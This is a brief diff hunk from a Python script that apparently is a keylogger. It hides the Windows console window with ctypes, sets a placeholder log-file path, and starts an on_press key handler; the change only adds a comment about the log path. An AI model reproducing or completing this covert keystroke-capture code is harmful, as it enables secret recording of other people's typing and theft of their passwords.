@@ -5,7 +5,7 @@ import os
 if os.name == 'nt':
     import ctypes
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
+#Enter the path for your LOGFILE
 log_file = r"Path for your log file"
 
 def on_press(key):
